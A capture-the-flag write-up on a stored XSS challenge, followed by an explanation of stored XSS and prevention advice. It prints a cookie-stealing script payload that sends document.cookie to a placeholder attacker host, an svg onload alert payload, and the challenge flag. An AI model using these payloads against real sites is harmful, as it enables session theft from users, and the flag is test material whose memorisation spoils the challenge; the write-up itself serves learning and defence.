### Challenge

I tried a lot of payloads and techniques to have this flag. I tested first some protections :

The comment input removes anything in <> and changes quotes.
The name input is more permissive but allows <script> with spaces.
I constructed a POST request in insomnia to bypass the limitation of characters in the name field
I tried this payload:
```jsx
< script > document.location=”http://Attacker’sIP/cookiestealer.php?c=”document.cookie; </script>
```

I tried with a local server, and tested with request bin to steal the cookie of a potential bot that might turn out to be the flag. 0 result.

This script worked for an alert, but no flag was given:
```
</script><svg onload=alert("yooo")>
```

AFTER SEVERAL HOURS i saw a flag appeared in the site, we only needed have a `script` word (without < or >) to have the flag...
```
THE FLAG IS : 0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E
```

### Vulnerability

Cross-site scripting (XSS) is a security vulnerability that allows an attacker to inject malicious client-side code into a website.

![cross-site-scripting](https://github.com/Sleleu/darkly/assets/93100775/678dd760-6cee-4bf5-b6e5-78bba5aea712)

This type of attack can be used to steal user's cookies when they visit a vulnerable site (in the case of stored XSS)
or through phishing (in the case of reflected XSS).

In this case, we had in this challenge a stored XSS. It arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. The attacker does not need to find an external way of inducing other users because the script is now in the application itself, he only need to wait for users to visit the vulnerable website.

### How to prevent from XSS
- Use the flag `HttpOnly` for your cookies, they will be hidden from javascript
- Filter input of users
- Don't make this kind of challenge
- Use modern web framework. Modern web frameworks are less susceptible to XSS vulnerabilities, thanks to improved security measures and built-in protections.
- Use a content security policy (CSP). It reduce the vectors by which XSS can occur by specifying the domains that the browser should consider to be valid sources of executable scripts.

### Ressources
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- https://developer.mozilla.org/fr/docs/web/http/basics_of_http/data_urls
- https://portswigger.net/web-security/cross-site-scripting/stored
- https://www.we45.com/post/how-to-prevent-xss-why-base64-is-not-enough
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
